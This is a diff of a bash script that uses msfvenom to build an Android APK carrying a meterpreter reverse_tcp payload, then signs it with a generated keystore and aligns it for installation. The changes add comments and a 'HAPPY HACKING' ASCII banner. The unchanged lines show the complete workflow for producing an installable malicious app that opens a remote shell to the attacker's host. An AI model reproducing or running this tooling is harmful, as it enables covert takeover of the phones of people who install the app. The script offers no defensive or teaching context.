@@ -30,7 +30,7 @@ echo "
 echo "Generating APK with reverse TCP payload..."
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $DESKTOP_PATH/$APK_NAME
 
-# Check if msfvenom was successful
+# Check if msfvenom was successful, if not then exit the script
 if [ $? -ne 0 ]; then
     echo "Error: Failed to generate the APK with msfvenom."
     exit 1
@@ -38,7 +38,7 @@ fi
 
 APK_LOCATION="$DESKTOP_PATH/$APK_NAME"  # Path to the generated APK
 
-# Create keystore if it doesn't exist
+# Create keystore if it doesn't exist then generate one thats Jetski themed using keytool
 if [ ! -f "$KEYSTORE" ]; then
     echo "Creating keystore..."
     keytool -genkey -v -keystore $KEYSTORE -alias $ALIAS -keyalg $KEYALG -keysize $KEYSIZE -validity $VALIDITY -storepass $KEYPASS -keypass $APKPASS <<EOF
@@ -62,4 +62,15 @@ jarsigner -verbose -keystore $KEYSTORE -storepass $KEYPASS -keypass $APKPASS $AP
 echo "Aligning APK..."
 zipalign -v 4 $APK_LOCATION $DESKTOP_PATH/$OUTPUT_APK_NAME
 
+# Output the path to the signed and aligned APK
 echo "Done. Signed and aligned APK is: $DESKTOP_PATH/$OUTPUT_APK_NAME"
+
+echo "
+
+██╗  ██╗ █████╗ ██████╗ ██████╗ ██╗   ██╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
+██║  ██║██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝ 
+███████║███████║██████╔╝██████╔╝ ╚████╔╝     ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗
+██╔══██║██╔══██║██╔═══╝ ██╔═══╝   ╚██╔╝      ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║
+██║  ██║██║  ██║██║     ██║        ██║       ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝
+╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝        ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
+"
